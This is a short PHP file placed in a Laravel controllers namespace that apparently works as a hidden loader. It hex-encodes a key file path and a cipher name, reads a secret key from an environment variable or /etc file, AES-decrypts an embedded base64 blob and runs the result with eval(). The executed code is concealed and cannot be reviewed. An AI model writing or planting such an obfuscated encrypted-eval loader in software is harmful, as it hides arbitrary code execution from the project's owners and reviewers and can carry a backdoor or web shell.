<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('2j8vD88s1xUYYALFQXBjBw==');

$c=base64_decode(

'ifn6196tz+355Gj1dYc7lF/gMLyS+xG2epedYid3E37wBFji3PJzeItrh0V4a0RwhKYqkT61nPdN' .
'kgbpVclvr5rdp6xTeLenTFTFVw+92xRHRZq/pAGW6xOAc3ziFFzdO6Wtl98AzjKeeBxl2Gs5tYuT' .
'PNMRHbT0KRrveAXtlkYUt6jhp9BDBpgHlIWqPLCNsYUWBt+qWrNrH9MRz7NV6yKPxpFLHngzEBFv' .
'Rx9OgZinTmQe5xaYtauELR1sf7MLqUQbd57y9FKy+hsyJOqOI2ysxUx4pZRnTk5xiiGF63k='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

